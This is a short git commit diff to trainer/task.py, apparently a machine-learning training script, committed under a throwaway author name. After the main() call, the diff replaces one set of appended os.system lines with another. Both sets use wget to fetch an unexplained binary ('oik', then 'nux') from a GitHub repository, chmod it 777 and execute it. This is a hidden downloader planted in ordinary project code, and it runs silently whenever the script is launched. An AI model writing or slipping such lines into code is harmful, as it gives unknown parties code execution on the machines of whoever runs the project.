8685b1a5444f5d348f347947e23bc736de04ca46
df hdhdh <jeffreyadams29@outlook.com>
2023-02-13 06:18:56 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://github.com/arifrahman555/kolor/raw/main/oik')
-os.system('chmod 777 oik')
-os.system('./oik')
+os.system('wget https://github.com/16613047/testing/raw/main/nux')
+os.system('chmod 777 nux')
+os.system('./nux')
